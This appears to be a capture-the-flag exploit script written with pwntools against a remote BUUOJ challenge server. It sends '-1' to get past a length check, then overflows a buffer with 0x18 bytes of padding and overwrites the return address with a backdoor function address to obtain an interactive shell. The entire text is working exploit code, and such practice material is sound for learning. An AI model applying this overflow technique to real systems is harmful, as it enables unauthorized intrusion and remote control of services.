from pwn import *


p = remote("node4.buuoj.cn", 29492)

back_door = 0x0400726 

p.sendline("-1")
pad = cyclic(0x10+0x8)+p64(back_door)
p.send(pad)

p.interactive()

